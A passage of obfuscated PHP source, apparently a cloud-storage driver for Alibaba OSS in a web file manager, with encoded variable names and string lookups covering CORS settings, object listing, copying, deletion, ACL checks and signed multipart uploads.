OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $–·À¤Ú =& $_SERVER[¹àö™Ç¾]; $õ·çåó¦ = new OSS\Model\CorsConfig(); $ä¸ğ¤‹ = new OSS\Model\CorsRule(); $ä¸ğ¤‹->addAllowedOrigin($–·À¤Ú[1368]); $ä¸ğ¤‹->addAllowedMethod($–·À¤Ú[1369]); $ä¸ğ¤‹->addAllowedMethod($–·À¤Ú[1370]); $ä¸ğ¤‹->addAllowedMethod($–·À¤Ú[1371]); $ä¸ğ¤‹->addAllowedMethod($–·À¤Ú[1372]); $ä¸ğ¤‹->addAllowedMethod($–·À¤Ú[167]); $ä¸ğ¤‹->setMaxAgeSeconds(600); $ä¸ğ¤‹->addExposeHeader($–·À¤Ú[1373]); $ä¸ğ¤‹->addAllowedHeader($–·À¤Ú[1368]); $õ·çåó¦->addRule($ä¸ğ¤‹); try { $this->client->putBucketCors($this->bucket, $õ·çåó¦); } catch (OSS\Core\OssException $»½½ãÅ•) { return !1; } return !0; } public function getBucketCors() { $ãØº››â =& $_SERVER[¹àö™Ç¾]; $‰İæÅĞ = null; try { $‰İæÅĞ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÊÖèıÎ”) { return null; } if (!$‰İæÅĞ || !($¼¹Ùë¨¨ = $‰İæÅĞ->getRules())) { return null; } $ØûÎ‰´« = $¼¹Ùë¨¨[0]->getAllowedOrigins(); $—×¤¤Òµ = $¼¹Ùë¨¨[0]->getAllowedMethods(); $šËÍ´˜ï = $¼¹Ùë¨¨[0]->getMaxAgeSeconds(); $ƒ¼õÈ‚… = $¼¹Ùë¨¨[0]->getExposeHeaders(); $œØƒÆ = $¼¹Ùë¨¨[0]->getAllowedHeaders(); return array($ãØº››â[190] => isset($ØûÎ‰´«[0]) ? $ØûÎ‰´«[0] : $ãØº››â[22], $ãØº››â[194] => $—×¤¤Òµ, $ãØº››â[1374] => $šËÍ´˜ï, $ãØº››â[1375] => isset($ƒ¼õÈ‚…[0]) ? $ƒ¼õÈ‚…[0] : $ãØº››â[22], $ãØº››â[192] => isset($œØƒÆ[0]) ? $œØƒÆ[0] : $ãØº››â[22]); } public function isBucketCors() { $…«öÓï£ =& $_SERVER[¹àö™Ç¾]; $ÛëÓõğ = $this->getBucketCors(); if (!$ÛëÓõğ || !is_array($ÛëÓõğ)) { return !1; } if ($ÛëÓõğ[$…«öÓï£[190]] != $…«öÓï£[191] || $ÛëÓõğ[$…«öÓï£[192]] != $…«öÓï£[191]) { return !1; } $¶²µÚÔ± = array_map($…«öÓï£[193], $ÛëÓõğ[$…«öÓï£[194]]); if (!is_array($¶²µÚÔ±)) { $¶²µÚÔ± = array(); } $»ó¼¡ôË = array($…«öÓï£[195], $…«öÓï£[196], $…«öÓï£[197], $…«öÓï£[198], $…«öÓï£[199]); $üˆ¼Å… = array_diff($»ó¼¡ôË, $¶²µÚÔ±); return empty($üˆ¼Å…); } public function mkfile($ú›úê¼æ, $ÛÄîëÎó = '', $¢ïãüá¸ = REPEAT_RENAME) { $ºÚ‡àü¹ = $this->setContent($ú›úê¼æ, $ÛÄîëÎó); if ($ºÚ‡àü¹ !== !1) { return $this->getPathOuter($ú›úê¼æ); } return !1; } public function mkdir($ş›°ïÇµ, $¸§¨ä÷¼ = REPEAT_SKIP) { if ($this->_isFolder($ş›°ïÇµ)) { return $this->getPathOuter($ş›°ïÇµ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ş›°ïÇµ)); } catch (OSS\Core\OssException $ç¦¡Í¯¦) { return !1; } return $this->getPathOuter($ş›°ïÇµ); } private function fileList($—–À›‚€, $ÄŒëœèÕ = '', $Ë¤ş°° = 0) { $»Ëà™î‚ =& $_SERVER[¹àö™Ç¾]; $—–À›‚€ = trim($—–À›‚€, $»Ëà™î‚[18]); $ø†õÇü = empty($—–À›‚€) && $—–À›‚€ !== $»Ëà™î‚[200] ? $»Ëà™î‚[22] : $—–À›‚€ . $»Ëà™î‚[18]; $¯ñò¼Ô = $»Ëà™î‚[22]; $´Ÿ‡ª– = 1000; $²™Ñ© = $this->listItemCache === !1 ? !1 : !0; $ —©ù’‰ = $ä–ÔçĞ° = array(); while (!0) { check_abort(); $ôÕşªÆ§ = array($»Ëà™î‚[1376] => $ÄŒëœèÕ, $»Ëà™î‚[1377] => $ø†õÇü, $»Ëà™î‚[1378] => $´Ÿ‡ª–, $»Ëà™î‚[1379] => $¯ñò¼Ô); try { $ƒ¾Ò„Òñ = $this->client->listObjects($this->bucket, $ôÕşªÆ§); } catch (OSS\Core\OssException $£°Š½‡) { break; } $¯ñò¼Ô = $ƒ¾Ò„Òñ->getNextMarker(); $ÜíÊ¬¤ = $ƒ¾Ò„Òñ->getObjectList(); $ÇÅˆÔ»ò = $ƒ¾Ò„Òñ->getPrefixList(); foreach ($ÜíÊ¬¤ as $–˜™¥¯§) { if ($–˜™¥¯§->getKey() == $ø†õÇü) { continue; } $Æ¦¹—³ = $–˜™¥¯§->getKey(); $†ë¿³¿ = $–˜™¥¯§->getSize(); $ØÙ–ïûŸ = $–˜™¥¯§->getLastModified(); $ˆì¬Î²° = $Ë¤ş°° ? array($»Ëà™î‚[42] => $Æ¦¹—³, $»Ëà™î‚[90] => $†ë¿³¿, $»Ëà™î‚[206] => strtotime($ØÙ–ïûŸ)) : $Æ¦¹—³; $‹¼Ö­¨Î = $†ë¿³¿ == 0 && substr($Æ¦¹—³, strlen($Æ¦¹—³) - 1, 1) == $»Ëà™î‚[18] ? !0 : !1; if ($²™Ñ©) { $this->cacheMethod($»Ëà™î‚[208], $Æ¦¹—³, $‹¼Ö­¨Î); $this->cacheMethod($»Ëà™î‚[209], $Æ¦¹—³, array($»Ëà™î‚[90] => $†ë¿³¿, $»Ëà™î‚[1380] => $†ë¿³¿, $»Ëà™î‚[96] => strtotime($ØÙ–ïûŸ), $»Ëà™î‚[1381] => $ØÙ–ïûŸ)); } if ($‹¼Ö­¨Î) { $ —©ù’‰[] = $Æ¦¹—³; continue; } $ä–ÔçĞ°[] = $ˆì¬Î²°; } foreach ($ÇÅˆÔ»ò as $ÒÆÆ â—) { $ —©ù’‰[] = $ÒÆÆ â—->getPrefix(); if ($²™Ñ©) { $this->cacheMethod($»Ëà™î‚[208], $Æ¦¹—³, !0); } } if ($¯ñò¼Ô === $»Ëà™î‚[22]) { break; } } if ($²™Ñ©) { $this->cacheMethod($»Ëà™î‚[208], $—–À›‚€, !0); } return array($»Ëà™î‚[87] => $ —©ù’‰, $»Ëà™î‚[86] => $ä–ÔçĞ°); } public function copyFile($šËÛ‰Ì“, $ô§›Ğ…) { $˜áù¦· = $this->size($šËÛ‰Ì“); if ($˜áù¦· < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $šËÛ‰Ì“, $this->bucket, $this->pathEncode($ô§›Ğ…)); } catch (OSS\Core\OssException $ßşÅğ†›) { return !1; } return $this->getPathOuter($ô§›Ğ…); } $±ÉÕö»ü = $this->multiCopyObject($šËÛ‰Ì“, $ô§›Ğ…, $˜áù¦·); return $±ÉÕö»ü ? $this->getPathOuter($ô§›Ğ…) : !1; } private function multiCopyObject($ØæöªĞı, $İÊ¶¥Íˆ, $ÍôÕˆ­°) { $¶¬–®› =& $_SERVER[¹àö™Ç¾]; try { $³¤Ííˆê = array(); if ($ÄµÙç¾‘ = $this->hashMd5($ØæöªĞı)) { $³¤Ííˆê = array(OSS\OssClient::OSS_HEADERS => array($¶¬–®›[1382] => $ÄµÙç¾‘)); } $İÈ²Ÿ€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İÊ¶¥Íˆ), $³¤Ííˆê); $”İƒÆÏÙ = 1; $­’İ = 0; $ÓÚ¨úù¸ = array(); $£í¡Üü‘ = 1024 * 1024 * 10; $şõ§Œæß = $this->client->generateMultiuploadParts($ÍôÕˆ­°, $£í¡Üü‘); foreach ($şõ§Œæß as $şò İÈ => $¤“é›€ ) { $°°üıÉş = $­’İ + (int) $¤“é›€ [$¶¬–®›[1383]]; $á¡ìüÑñ = (int) $¤“é›€ [$¶¬–®›[341]] + $°°üıÉş - 1; $‰õ÷‚„™ = array($¶¬–®›[1384] => $°°üıÉş, $¶¬–®›[1385] => $á¡ìüÑñ); $ÓÚ¨úù¸[] = $this->client->uploadPartCopy($this->bucket, $ØæöªĞı, $this->bucket, $this->pathEncode($İÊ¶¥Íˆ), $”İƒÆÏÙ, $İÈ²Ÿ€, $‰õ÷‚„™); $”İƒÆÏÙ = $”İƒÆÏÙ + 1; } $¢Ä¦ºï„ = array(); foreach ($ÓÚ¨úù¸ as $şò İÈ => $÷äæí¼) { $¢Ä¦ºï„[] = array($¶¬–®›[1386] => $şò İÈ + 1, $¶¬–®›[1387] => $÷äæí¼); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($İÊ¶¥Íˆ), $İÈ²Ÿ€, $¢Ä¦ºï„); } catch (OSS\Core\OssException $ñªÔÎÏ²) { return !1; } return !0; } public function moveFile($ –³Š–¼, $•‹ÅŒÂ) { if ($this->copyFile($ –³Š–¼, $•‹ÅŒÂ)) { $this->remove($ –³Š–¼); return $this->getPathOuter($•‹ÅŒÂ); } return !1; } public function delFile($öåìşå¿) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($öåìşå¿)); } catch (OSS\Core\OssException $µÒÍµ¥â) { return !1; } return !0; } public function delFolder($«·¨èÌò) { $¥ª¼©î¡ =& $_SERVER[¹àö™Ç¾]; if (!$this->exist($«·¨èÌò)) { return !0; } $this->listItemCache = !1; $Âîä–îÏ = $this->fileList($«·¨èÌò); $this->listItemCache = !0; $è²³’Õğ = trim($«·¨èÌò, $¥ª¼©î¡[18]) . $¥ª¼©î¡[18]; if (!empty($«·¨èÌò) && $«·¨èÌò !== $¥ª¼©î¡[200] && !in_array($è²³’Õğ, $Âîä–îÏ[$¥ª¼©î¡[87]])) { $Âîä–îÏ[$¥ª¼©î¡[87]][] = $è²³’Õğ; } $éø¿£Òû = $this->delByBatch($Âîä–îÏ[$¥ª¼©î¡[86]]); if (!$éø¿£Òû) { return !1; } $éø¿£Òû = $this->delByBatch($Âîä–îÏ[$¥ª¼©î¡[87]]); if (!$éø¿£Òû) { return !1; } return $this->delFile($è²³’Õğ); } private function delByBatch($ü ¸™ÆŠ) { foreach (array_chunk($ü ¸™ÆŠ, 1000) as $¸†ÄˆùÒ) { try { $this->client->deleteObjects($this->bucket, $¸†ÄˆùÒ); } catch (OSS\Core\OssException $îÙ‹¢øœ) { return !1; } } return !0; } public function rename($Ûåİé’„, $ÈÂõ¦ªŞ) { return $this->renameObject($Ûåİé’„, $ÈÂõ¦ªŞ); } private function fileInfo($µ˜ƒ¥‡à, $õìÜ¶‹ß = false, $Şª¨şìø = array()) { $†¥ÁÊı =& $_SERVER[¹àö™Ç¾]; $ŞÜØÁÓ³ = array($†¥ÁÊı[42] => $this->pathThis($µ˜ƒ¥‡à), $†¥ÁÊı[88] => $this->getPathOuter($µ˜ƒ¥‡à), $†¥ÁÊı[43] => $†¥ÁÊı[202], $†¥ÁÊı[90] => isset($Şª¨şìø[$†¥ÁÊı[90]]) ? $Şª¨şìø[$†¥ÁÊı[90]] : 0, $†¥ÁÊı[177] => $this->ext($µ˜ƒ¥‡à)); if ($õìÜ¶‹ß) { return $ŞÜØÁÓ³; } $ŞÜØÁÓ³[$†¥ÁÊı[203]] = $ŞÜØÁÓ³[$†¥ÁÊı[96]] = 0; $ŞÜØÁÓ³[$†¥ÁÊı[204]] = $ŞÜØÁÓ³[$†¥ÁÊı[205]] = !0; if (empty($Şª¨şìø)) { $µúèÔ—¥ = $this->objectMeta($µ˜ƒ¥‡à); if (!$µúèÔ—¥) { return $ŞÜØÁÓ³; } $Şª¨şìø = array($†¥ÁÊı[96] => strtotime($µúèÔ—¥[$†¥ÁÊı[1381]]), $†¥ÁÊı[90] => $µúèÔ—¥[$†¥ÁÊı[1380]] + 0); } if (isset($Şª¨şìø[$†¥ÁÊı[90]])) { $ŞÜØÁÓ³[$†¥ÁÊı[90]] = $Şª¨şìø[$†¥ÁÊı[90]]; } if (isset($Şª¨şìø[$†¥ÁÊı[96]])) { $ŞÜØÁÓ³[$†¥ÁÊı[96]] = $Şª¨şìø[$†¥ÁÊı[96]]; } if (isset($Şª¨şìø[$†¥ÁÊı[206]]) && !trim($ŞÜØÁÓ³[$†¥ÁÊı[96]])) { $ŞÜØÁÓ³[$†¥ÁÊı[96]] = $Şª¨şìø[$†¥ÁÊı[206]]; } return $ŞÜØÁÓ³; } private function folderInfo($Ü°’õµã, $øø±±‘Ğ = false, $óÖ¥îàÑ = array()) { $öÈÚâ”‚ =& $_SERVER[¹àö™Ç¾]; $ñÔêëÀ— = array($öÈÚâ”‚[42] => $this->pathThis($Ü°’õµã), $öÈÚâ”‚[88] => $this->getPathOuter($öÈÚâ”‚[18] . $Ü°’õµã), $öÈÚâ”‚[43] => $öÈÚâ”‚[89]); if ($øø±±‘Ğ) { return $ñÔêëÀ—; } $ñÔêëÀ—[$öÈÚâ”‚[203]] = $ñÔêëÀ—[$öÈÚâ”‚[96]] = 0; $ñÔêëÀ—[$öÈÚâ”‚[204]] = $ñÔêëÀ—[$öÈÚâ”‚[205]] = !0; if (empty($óÖ¥îàÑ)) { $Ü°’õµã = rtrim($Ü°’õµã, $öÈÚâ”‚[18]) . $öÈÚâ”‚[18]; $é´ÛŞ£… = $this->objectMeta($Ü°’õµã); if (!$é´ÛŞ£…) { return $ñÔêëÀ—; } $óÖ¥îàÑ = array($öÈÚâ”‚[203] => $é´ÛŞ£…[$öÈÚâ”‚[511]][$öÈÚâ”‚[1388]], $öÈÚâ”‚[96] => strtotime($é´ÛŞ£…[$öÈÚâ”‚[1381]])); } if (isset($óÖ¥îàÑ[$öÈÚâ”‚[96]])) { $ñÔêëÀ—[$öÈÚâ”‚[96]] = $óÖ¥îàÑ[$öÈÚâ”‚[96]]; } if (isset($óÖ¥îàÑ[$öÈÚâ”‚[203]])) { $ñÔêëÀ—[$öÈÚâ”‚[203]] = $óÖ¥îàÑ[$öÈÚâ”‚[203]]; } return $ñÔêëÀ—; } public function listPath($ïıúÜÒ, $çîù²„Ì = false) { $½ëûòóà =& $_SERVER[¹àö™Ç¾]; $±…Âœ¬ê = $this->fileList($ïıúÜÒ, $½ëûòóà[18], !0); foreach ($±…Âœ¬ê[$½ëûòóà[87]] as $¥à·ë³Ê => $òØæ½ÕÕ) { $±…Âœ¬ê[$½ëûòóà[87]][$¥à·ë³Ê] = $this->folderInfo($òØæ½ÕÕ, $çîù²„Ì, $òØæ½ÕÕ); } foreach ($±…Âœ¬ê[$½ëûòóà[86]] as $¥à·ë³Ê => $òØæ½ÕÕ) { $±…Âœ¬ê[$½ëûòóà[86]][$¥à·ë³Ê] = $this->fileInfo($òØæ½ÕÕ[$½ëûòóà[42]], $çîù²„Ì, $òØæ½ÕÕ); } return $±…Âœ¬ê; } public function has($‰¤ïùüÚ, $Ÿ˜â©‚È = false, $›Ù“µ±¢ = true) { $ù…œ¦¿÷ =& $_SERVER[¹àö™Ç¾]; $‰¤ïùüÚ = trim($‰¤ïùüÚ, $ù…œ¦¿÷[18]); $Ù¿Ğ€Ùº = empty($‰¤ïùüÚ) && $‰¤ïùüÚ !== $ù…œ¦¿÷[200] ? $ù…œ¦¿÷[22] : $‰¤ïùüÚ . $ù…œ¦¿÷[18]; $ÔÓÜåÖ· = $ù…œ¦¿÷[22]; $à¾êô‰ = 500; $Ú¢–†âĞ = $Àæ¸Éù = 0; while (!0) { check_abort(); $Äß¡ÎŠ = array($ù…œ¦¿÷[1376] => $ù…œ¦¿÷[18], $ù…œ¦¿÷[1377] => $Ù¿Ğ€Ùº, $ù…œ¦¿÷[1378] => $à¾êô‰, $ù…œ¦¿÷[1379] => $ÔÓÜåÖ·); try { $§…ƒ¨©· = $this->client->listObjects($this->bucket, $Äß¡ÎŠ); } catch (OSS\Core\OssException $Ò²Ï—¡¤) { break; } $ÔÓÜåÖ· = $§…ƒ¨©·->getNextMarker(); $è¦è†³ = $§…ƒ¨©·->getObjectList(); $‘òüÂ—Ô = $§…ƒ¨©·->getPrefixList(); if ($Ÿ˜â©‚È) { if (count($è¦è†³) > 1 || count($è¦è†³) == 1 && $è¦è†³[0]->getKey() != $Ù¿Ğ€Ùº) { $Ú¢–†âĞ += count($è¦è†³) - 1; } if (!empty($‘òüÂ—Ô)) { $Àæ¸Éù += count($‘òüÂ—Ô); } if ($ÔÓÜåÖ· === $ù…œ¦¿÷[22]) { break; } continue; } if ($›Ù“µ±¢) { if (!empty($è¦è†³)) { if (count($è¦è†³) > 1 || $è¦è†³[0]->getKey() != $Ù¿Ğ€Ùº) { return !0; } } } else { if (!empty($‘òüÂ—Ô)) { return !0; } } if ($ÔÓÜåÖ· === $ù…œ¦¿÷[22]) { break; } } if ($Ÿ˜â©‚È) { return array($ù…œ¦¿÷[212] => $Ú¢–†âĞ, $ù…œ¦¿÷[213] => $Àæ¸Éù); } return !1; } public function listAll($…ÙšŸé) { $Ü—ëÕŸÛ =& $_SERVER[¹àö™Ç¾]; $ˆôåº™ = $this->fileList($…ÙšŸé, $Ü—ëÕŸÛ[22], !0); $Ê ö©¤è = array(); foreach ($ˆôåº™[$Ü—ëÕŸÛ[86]] as $æ²í…ÒÑ) { $Ê ö©¤è[$æ²í…ÒÑ[$Ü—ëÕŸÛ[42]]] = $æ²í…ÒÑ[$Ü—ëÕŸÛ[90]]; } foreach ($ˆôåº™[$Ü—ëÕŸÛ[87]] as $æ²í…ÒÑ) { if (is_string($æ²í…ÒÑ)) { $Ê ö©¤è[$æ²í…ÒÑ] = 0; } } return $this->listAllFiles($…ÙšŸé, array_keys($Ê ö©¤è), $Ê ö©¤è); } public function canRead($§¿‡®±ä) { $§åš€ëÌ =& $_SERVER[¹àö™Ç¾]; $è¾ŠšĞ˜ = $this->pathAcl($§¿‡®±ä); return $è¾ŠšĞ˜ == $§åš€ëÌ[1389] || $è¾ŠšĞ˜ == $§åš€ëÌ[550] ? !0 : !1; } public function canWrite($®÷ùâĞ) { $×Ûîîè‰ = $this->pathAcl($®÷ùâĞ); return $×Ûîîè‰ == $_SERVER[¹àö™Ç¾][550] ? !0 : !1; } public function pathAcl($Ø›ÌÉßÇ) { $ùğ×ĞàÉ =& $_SERVER[¹àö™Ç¾]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÂŠÁÑÑÈ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ø›ÌÉßÇ)); } catch (OSS\Core\OssException $§€…–ü•) { return !1; } $œœŸ²öô = $ÂŠÁÑÑÈ == $ùğ×ĞàÉ[47] ? $this->bucketAcl : $ÂŠÁÑÑÈ; if ($œœŸ²öô == $ùğ×ĞàÉ[1390]) { return $ùğ×ĞàÉ[1389]; } if ($œœŸ²öô == $ùğ×ĞàÉ[1391]) { return $ùğ×ĞàÉ[550]; } return $œœŸ²öô; } private function chmodPath($šçö…—ó, $Ö Ì¾Úº = '') { $Šñ’Ğ¥• =& $_SERVER[¹àö™Ç¾]; $ù’Ìµ¤« = empty($Ö Ì¾Úº) ? $Šñ’Ğ¥•[1391] : $Ö Ì¾Úº; $¶á‡ª÷Ÿ = array($Šñ’Ğ¥•[47], $Šñ’Ğ¥•[201], $Šñ’Ğ¥•[1390], $Šñ’Ğ¥•[1391]); if (!in_array($ù’Ìµ¤«, $¶á‡ª÷Ÿ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($šçö…—ó), $ù’Ìµ¤«); } catch (OSS\Core\OssException $Ä¿ÃÊƒ) { return !1; } return !0; } public function getContent($Äøİ³Ú) { return $this->fileSubstr($Äøİ³Ú, -1); } public function setContent($Ş†¿¸¸ø, $»•ªóÍ = '') { $“‡’Ùƒ¾ =& $_SERVER[¹àö™Ç¾]; try { $Ü­Å±™Ç = $this->trafficLimit($“‡’Ùƒ¾[1392]); $Ğœ…«› = $this->client->putObject($this->bucket, $this->pathEncode($Ş†¿¸¸ø), $»•ªóÍ, $Ü­Å±™Ç); } catch (OSS\Core\OssException $ñöÖÏğé) { return !1; } $×¹àÏ—£ = array($“‡’Ùƒ¾[1382] => trim($Ğœ…«›[$“‡’Ùƒ¾[1393]], $“‡’Ùƒ¾[127]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ş†¿¸¸ø))); $this->updateObjMeta($Ş†¿¸¸ø, $×¹àÏ—£); return isset($Ğœ…«›[$“‡’Ùƒ¾[1394]][$“‡’Ùƒ¾[1341]]) ? !0 : !1; } private function updateObjMeta($Ü–á§ì, $Øæ¶”‹¶) { $Ü–á§ì = $this->pathEncode($Ü–á§ì); try { $¦¸†å£ = array(OSS\OssClient::OSS_HEADERS => $Øæ¶”‹¶); $this->client->copyObject($this->bucket, $Ü–á§ì, $this->bucket, $Ü–á§ì, $¦¸†å£); } catch (OSS\Core\OssException $¶ÁŸ©ë±) { return !1; } return !0; } public function upload($ª±ã°§ë, $··¨òêŠ, $Àî­ÓáÎ = false, $‚Ó±‚•œ = REPEAT_REPLACE) { $©Ğº¬° =& $_SERVER[¹àö™Ç¾]; $ñÚãÉ¨ = trim($ª±ã°§ë, $©Ğº¬°[18]); $²Ò‹“ù³ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($©Ğº¬°[1382] => @md5_file($··¨òêŠ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ª±ã°§ë))); $²Ò‹“ù³ = $this->trafficLimit($©Ğº¬°[1392], $²Ò‹“ù³); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ñÚãÉ¨), $··¨òêŠ, $²Ò‹“ù³); } catch (OSS\Core\OssException $¾õë§ÕŸ) { return !1; } return $this->getPathOuter($ª±ã°§ë); } public function getHost() { $†»†ëµ’ =& $_SERVER[¹àö™Ç¾]; $›•Ç®»Œ = explode($†»†ëµ’[186], parent::getHost()); return $›•Ç®»Œ[0] . $†»†ëµ’[186] . $this->bucket . $†»†ëµ’[20] . $›•Ç®»Œ[1]; } public function uploadFormData($Ÿ–¿ÅÚ, $æïÕ“Êñ = 3600) { $şÊ»—Ÿô =& $_SERVER[¹àö™Ç¾]; if (!($½¸Öôô = $this->getHost())) { return !1; } $¦˜¬‚’Ú = $æïÕ“Êñ; $ªŒ°ß®Ó = date($şÊ»—Ÿô[1395], time() + $¦˜¬‚’Ú); $°æ¾„  = new DateTime($ªŒ°ß®Ó); $æ¬ïÏ–ç = $°æ¾„ ->format(DateTime::ISO8601); $Š÷ú¿¬¥ = strpos($æ¬ïÏ–ç, $şÊ»—Ÿô[300]); $æ¬ïÏ–ç = substr($æ¬ïÏ–ç, 0, $Š÷ú¿¬¥) . $şÊ»—Ÿô[1396]; $¯¾Ù¿ñ¿ = 1048576000 * 5; $ŠƒÔÄÉî = $this->pathFather($Ÿ–¿ÅÚ); $¢Æß—İÎ = array($şÊ»—Ÿô[1295] => $æ¬ïÏ–ç, $şÊ»—Ÿô[1296] => array(array($şÊ»—Ÿô[1397], 0, $¯¾Ù¿ñ¿), array($şÊ»—Ÿô[1299], $şÊ»—Ÿô[1300], $ŠƒÔÄÉî))); $ñÕÈÇ÷¸ = base64_encode(json_encode($¢Æß—İÎ)); $Å¦Š­Â = base64_encode(hash_hmac($şÊ»—Ÿô[236], $ñÕÈÇ÷¸, $this->secret, !0)); $Ù¥ğõñø = array($şÊ»—Ÿô[1305] => $ñÕÈÇ÷¸, $şÊ»—Ÿô[1398] => $this->accessKey, $şÊ»—Ÿô[1301] => $şÊ»—Ÿô[1293], $şÊ»—Ÿô[1399] => $Å¦Š­Â, $şÊ»—Ÿô[184] => $½¸Öôô); $Ù¥ğõñø = $this->trafficLimit($şÊ»—Ÿô[1392], $Ù¥ğõñø); return $Ù¥ğõñø; } public function multiUploadFormData($İ…ƒÃ¯¯, $ÉÓÍĞ÷Ö = 3600) { $º»ªú„ =& $_SERVER[¹àö™Ç¾]; if (!($óşÄå®Ê = $this->getHost())) { return !1; } $³í¿¥áÄ = $this->trafficLimit($º»ªú„[1392]); $—ŒÇ‚à• = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İ…ƒÃ¯¯), $³í¿¥áÄ); return array($º»ªú„[228] => $—ŒÇ‚à•, $º»ªú„[184] => $óşÄå®Ê . $º»ªú„[18] . $this->pathEncode($İ…ƒÃ¯¯), $º»ªú„[229] => gmdate($º»ªú„[1400]), $º»ªú„[105] => $İ…ƒÃ¯¯); } public function multiUploadAuthData($†Ñß¿óÄ, $¶¼üÄŒ§ = array()) { $ÎŸÖõı· =& $_SERVER[¹àö™Ç¾]; $à¼–×àı = isset($¶¼üÄŒ§[$ÎŸÖõı·[229]]) ? $¶¼üÄŒ§[$ÎŸÖõı·[229]] : gmdate($ÎŸÖõı·[1400]); $–áí¯Úó = isset($¶¼üÄŒ§[$ÎŸÖõı·[177]]) ? $¶¼üÄŒ§[$ÎŸÖõı·[177]] : $ÎŸÖõı·[22]; $’®°£†Ä = $†Ñß¿óÄ; if (isset($¶¼üÄŒ§[$ÎŸÖõı·[105]])) { $’®°£†Ä = $¶¼üÄŒ§[$ÎŸÖõı·[105]]; unset($¶¼üÄŒ§[$ÎŸÖõı·[105]]); } if (isset($¶¼üÄŒ§[$ÎŸÖõı·[230]])) { $¶¼üÄŒ§[$ÎŸÖõı·[229]] = $à¼–×àı; return $this->listUploadParts($’®°£†Ä, $¶¼üÄŒ§); } $†úÀ°¹” = array($ÎŸÖõı·[231], $ÎŸÖõı·[22], $ÎŸÖõı·[128], $à¼–×àı, "\170\x2d\x6f\x73\163\x2d\x64\x61\x74\145\72{$à¼–×àı}", $ÎŸÖõı·[18] . $this->bucket . $ÎŸÖõı·[18] . $’®°£†Ä . $–áí¯Úó); if (strpos($–áí¯Úó, $ÎŸÖõı·[232]) === 0) { $†úÀ°¹”[0] = $ÎŸÖõı·[233]; if ($³ÑÙ©¸İ = $this->trafficLimit($ÎŸÖõı·[1392])) { $’®°£†Ä = $ÎŸÖõı·[1401]; array_splice($†úÀ°¹”, 5, 0, $’®°£†Ä . $ÎŸÖõı·[4] . $³ÑÙ©¸İ[$’®°£†Ä]); } } if (isset($¶¼üÄŒ§[$ÎŸÖõı·[234]]) && $¶¼üÄŒ§[$ÎŸÖõı·[234]] == $ÎŸÖõı·[235]) { $†úÀ°¹”[0] = $ÎŸÖõı·[235]; } if (!empty($¶¼üÄŒ§[$ÎŸÖõı·[1402]])) { $Å³åèœÚ = array_merge(array($†úÀ°¹”[4]), $¶¼üÄŒ§[$ÎŸÖõı·[1402]]); sort($Å³åèœÚ); $†úÀ°¹”[4] = implode($ÎŸÖõı·[11], $Å³åèœÚ); } $­‹²ç»§ = implode($ÎŸÖõı·[11], $†úÀ°¹”); $Ü©Í¦Øı = base64_encode(hash_hmac($ÎŸÖõı·[236], $­‹²ç»§, $this->secret, !0)); $ñôåê¦ö = $ÎŸÖõı·[1366] . $this->accessKey . $ÎŸÖõı·[4] . $Ü©Í¦Øı; if (strpos($–áí¯Úó, $ÎŸÖõı·[232]) === 0) { $ñôåê¦ö = array($ÎŸÖõı·[238] => $ñôåê¦ö, $ÎŸÖõı·[229] => $à¼–×àı); if ($³ÑÙ©¸İ) { $ñôåê¦ö = array_merge($ñôåê¦ö, $³ÑÙ©¸İ); } } return $ñôåê¦ö; } public function listUploadParts($¥ÕŠşùä, $—€œİÅ) { $›§·òèí =& $_SERVER[¹àö™Ç¾]; $ıİ¾òÏü = parse_url_query($—€œİÅ[$›§·òèí[177]]); $ÔÍºÄ¦­ = $this->client->listParts($this->bucket, $this->pathEncode($¥ÕŠşùä), $ıİ¾òÏü[$›§·òèí[228]]); $î‚™©“ˆ = $ÔÍºÄ¦­->getListPart(); $úú‘Ü˜î = array(); foreach ($î‚™©“ˆ as $é¶£Õ£¬) { $úú‘Ü˜î[] = array($›§·òèí[1386] => $é¶£Õ£¬->getPartNumber(), $›§·òèí[1387] => trim($é¶£Õ£¬->getETag(), $›§·òèí[127])); } unset($—€œİÅ[$›§·òèí[230]], $—€œİÅ[$›§·òèí[234]]); $¯ÌŸßÂ´ = $this->multiUploadAuthData($¥ÕŠşùä, $—€œİÅ); if (empty($¯ÌŸßÂ´)) { return !1; } return array($›§·òèí[238] => $¯ÌŸßÂ´, $›§·òèí[229] => $—€œİÅ[$›§·òèí[229]], $›§·òèí[240] => $úú‘Ü˜î); } public function download($´â¹ãş×, $şÂàÓû‘) { if ($this->isFolder($´â¹ãş×)) { return !1; } try { $®û³ëÒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $şÂàÓû‘); $®û³ëÒ = $this->trafficLimit($_SERVER[¹àö™Ç¾][120], $®û³ëÒ); $this->client->getObject($this->bucket, $this->pathEncode($´â¹ãş×), $®û³ëÒ); } catch (OSS\Core\OssException $êğä”±) { return !1; } return $şÂàÓû‘; } public function fileSubstr($üÉŞúí–, $¢æŒ‡òë = 0, $¬ò¯·‚ù = false) { if ($¢æŒ‡òë === -1) { $üÊõÄ’û = array(); } else { if ($¬ò¯·‚ù === !1) { $Õµ£¾†Ï = $this->size($üÉŞúí–); } else { $Õµ£¾†Ï = $¢æŒ‡òë + $¬ò¯·‚ù - 1; } $üÊõÄ’û = array(OSS\OssClient::OSS_RANGE => "{$¢æŒ‡òë}\x2d{$Õµ£¾†Ï}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($üÉŞúí–), $üÊõÄ’û); } catch (OSS\Core\OssException $¤ˆØ¯”) { 